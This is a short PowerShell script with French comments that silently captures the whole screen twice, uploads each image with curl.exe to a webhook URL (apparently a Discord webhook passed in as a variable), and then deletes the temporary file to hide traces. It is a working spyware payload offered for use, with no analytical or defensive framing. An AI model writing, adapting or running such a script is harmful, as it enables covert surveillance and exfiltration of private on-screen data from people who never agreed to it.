$hookurl = "$dc"
$a = 2 # Nombre de captures d'écran à prendre

# Détection de l'URL raccourcie
if ($hookurl.Length -ne 121) {
    Write-Host "URL du webhook raccourcie détectée.." 
    $hookurl = (irm $hookurl).url
}

# Fonction pour prendre une capture d'écran et l'envoyer
Function TakeAndSendScreenshot {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" $hookurl
    Start-Sleep 1
    Remove-Item -Path $filett
}

# Prendre et envoyer 2 captures d'écrande
for ($i = 0; $i -lt $a; $i++) {
    TakeAndSendScreenshot
}
